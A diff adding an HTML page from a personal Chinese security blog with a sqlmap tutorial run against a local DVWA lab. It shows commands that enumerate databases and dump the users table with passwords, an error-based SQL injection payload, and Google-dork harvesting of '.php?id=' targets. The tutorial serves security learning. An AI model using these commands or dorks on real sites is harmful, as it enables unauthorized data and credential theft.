@@ -1,0 +1,355 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xssong17</title>
+<meta name="description" content="我等着，等着你" />
+<link rel="shortcut icon" href="https://xssong17.github.io/favicon.ico?v=1704635108417">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://xssong17.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://xssong17.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://xssong17.github.io/images/avatar.png?v=1704635108417" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">xssong17</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#sqlmap%E7%9A%84%E5%AE%9E%E8%B7%B5%E4%B8%8E%E6%80%BB%E7%BB%93">sqlmap的实践与总结</a>
+<ul>
+<li><a href="#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95">本地测试</a>
+<ul>
+<li><a href="#1-%E6%9F%A5%E7%9C%8Bbanner%E4%BF%A1%E6%81%AF">1、查看banner信息</a></li>
+<li><a href="#2-%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF">2、查看数据库信息</a></li>
+<li><a href="#3-%E6%9F%A5%E7%9C%8B%E8%A1%A8%E6%A0%BC">3、查看表格</a></li>
+<li><a href="#4-%E6%9F%A5%E7%9C%8B%E8%A1%A8%E6%A0%BC%E7%9A%84%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF">4、查看表格的字段信息</a></li>
+<li><a href="#5-%E6%9F%A5%E7%9C%8B%E5%85%B7%E4%BD%93%E6%95%B0%E6%8D%AE">5、查看具体数据</a></li>
+<li><a href="#6-%E6%9F%A5%E7%9C%8B%E6%9F%90%E4%BA%9B%E5%AD%97%E6%AE%B5">6、查看某些字段</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E6%95%B0%E5%B0%8F%E7%BB%93">参数小结</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://xssong17.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">sqlmap的实践与总结</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-18 / 6 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h1 id="sqlmap的实践与总结">sqlmap的实践与总结</h1>
+<h2 id="本地测试">本地测试</h2>
+<h3 id="1-查看banner信息">1、查看banner信息</h3>
+<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; --banner
+</code></pre>
+<p>--cookie:指定cookie信息</p>
+<p>--banner：打印banner信息，准确的版本号</p>
+<figure data-type="image" tabindex="1"><img src="https://xssong17.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418191430.png" alt="QQ截图20210418191430" loading="lazy"></figure>
+<p>查看下报错注入的返回</p>
+<pre><code> http://127.0.0.1:80/DVWA/vulnerabilities/sqli/?id=1' AND EXTRACTVALUE(2972,CONCAT(0x5c,0x717a786b71,(SELECT (ELT(2972=2972,1))),0x71707a6271)) AND 'bOmG'='bOmG&amp;Submit=Submit
+</code></pre>
+<pre><code>XPATH syntax error: '\qzxkq1qpzbq'
+</code></pre>
+<p>？？？返回的是个啥？</p>
+<p>不过有手工注入的经验，知道可以注入就Ok了~</p>
+<h3 id="2-查看数据库信息">2、查看数据库信息</h3>
+<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; --dbs
+</code></pre>
+<p>--dbs：查看数据库信息</p>
+<figure data-type="image" tabindex="2"><img src="https://xssong17.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418191749.png" alt="QQ截图20210418191749" loading="lazy"></figure>
+<h3 id="3-查看表格">3、查看表格</h3>
+<p>可以看到很多的数据库，接下里我们就需要选择一个来进行深层次的查看</p>
+<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; --tables
+</code></pre>
+<p>-D：指定数据库</p>
+<p>--tables：查看表格信息</p>
+<figure data-type="image" tabindex="3"><img src="https://xssong17.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192200.png" alt="QQ截图20210418192200" loading="lazy"></figure>
+<p>显然，在dvwa数据库下有guestbook和user两张表格，接下来我们来查看表格的具体内容</p>
+<h3 id="4-查看表格的字段信息">4、查看表格的字段信息</h3>
+<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users --columns
+</code></pre>
+<p>-T：指定表格</p>
+<p>--columns：查看字段信息</p>
+<figure data-type="image" tabindex="4"><img src="https://xssong17.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192429.png" alt="QQ截图20210418192429" loading="lazy"></figure>
+<p>刚刚看到的就是users这张表中的数据信息，接下来看下具体的数据</p>
+<h3 id="5-查看具体数据">5、查看具体数据</h3>
+<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users --dump
+</code></pre>
+<p>--dump：导出数据</p>
+<figure data-type="image" tabindex="5"><img src="https://xssong17.github.io/post-images/sqlmap%E9%9A%8F%E8%AE%B0/QQ%E6%88%AA%E5%9B%BE20210418192718.png" alt="QQ截图20210418192718" loading="lazy"></figure>
+<h3 id="6-查看某些字段">6、查看某些字段</h3>
+<p>如果我们还想指定某些字段，可以使用-C参数</p>
+<pre><code>python sqlmap.py -u &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795&quot; -D &quot;dvwa&quot; -T users -C user_id,user,password --dump
+</code></pre>
+<h2 id="参数小结">参数小结</h2>
+<p>--users：列出所有管理用户。</p>
+<p>--dbs：获取所有数据库</p>
+<p>-D：指定数据库</p>
+<p>--tables：获取所有表</p>
+<p>-T：指定表</p>
+<p>--columns：获取所有字段</p>
+<p>-C：指定字段</p>
+<p>--dump：获取表中所有数据</p>
+<p>--cookie：指定cookie信息</p>
+<p>-m：通过url列表文件依次扫描站点</p>
+<pre><code>sqlmap -m example.txt
+</code></pre>
+<p>示例文件，example.txt</p>
+<pre><code>http://test.dvwa.com/vulnerabilities/sqli/?id=1&amp;Submit=Submit#
+http://test.dvwa.com/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#
+</code></pre>
+<p>-r：通过http请求文件进行扫描</p>
+<pre><code>sqlmap -r lalala.txt
+</code></pre>
+<p>示例文件，lalala.txt</p>
+<pre><code>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: no-cache
+Connection: keep-alive
+Cookie: security=low; PHPSESSID=67b7f213e539def6f15a725710c8c795
+Host: 127.0.0.1
+Pragma: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36 SE 2.X MetaSr 1.0
+</code></pre>
+<p>--random-agent：随机user-agent</p>
+<p>--proxy：指定代理</p>
+<p>--threads：指定http(s)最大请求数 (默认 1)</p>
+<p>-v：查看sqlmap的运行信息，一般使用3即可，具体如下</p>
+<blockquote>
+<p>共有七个等级，默认为1：</p>
+<p>0、只显示python错误以及严重的信息。</p>
+<p>1、同时显示基本信息和警告信息。（默认）</p>
+<p>2、同时显示debug信息。</p>
+<p>3、同时显示注入的payload。</p>
+<p>4、同时显示HTTP请求。</p>
+<p>5、同时显示HTTP响应头。</p>
+<p>6、同时显示HTTP响应页面。</p>
+</blockquote>
+<p>-g：从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理）</p>
+<pre><code>python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;
+</code></pre>
+<p>谷歌搜索技巧</p>
+<p>1、“xxx”<br>
+解释：搜素结果必须包含xxx关键字</p>
+<p>2、雪*白<br>
+解释：这里的*就是一个占位符，保证前面是雪，后面是白</p>
+<p>3、xxx inurl: baidu<br>
+解释：就是说xxx必须出现在网址的url中</p>
+<p>4、xxx insite:某网站域名<br>
+解释：指定某个网站中，搜索相关结果</p>
+<p>5、xxx &amp;gl=us,cn<br>
+解释：指定xxx结果的国家来源，us美国，cn中国</p>
+<p>-f：执行广泛的DBMS版本指纹检查</p>
+<p>--data：将数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
+<p>例子：</p>
+<pre><code>python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f
+</code></pre>
+<p>--is-dba：判断当前的用户是否为管理，是的话会返回True。</p>
+<p>--batch：用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p>
+<p>--crawl：sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。</p>
+<p>--eta：可以计算注入数据的剩余时间。</p>
+<p>参考文章：</p>
+<p>https://www.cnblogs.com/hongfei/p/3872156.html</p>
+<p>https://www.cnblogs.com/dagger9527/tag/Sqlmap/</p>
+<p>https://www.freebuf.com/sectool/164608.html</p>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://xssong17.github.io/post/dnslog-de-shi-yong/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  DNSlog的使用
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://xssong17.github.io/post/sql-zhu-ru-rao-guo-zi-shi-zong-jie-zhuan-zai/">
+                <h3 class="post-title">
+                  sql注入绕过姿势总结（转载）
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://xssong17.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
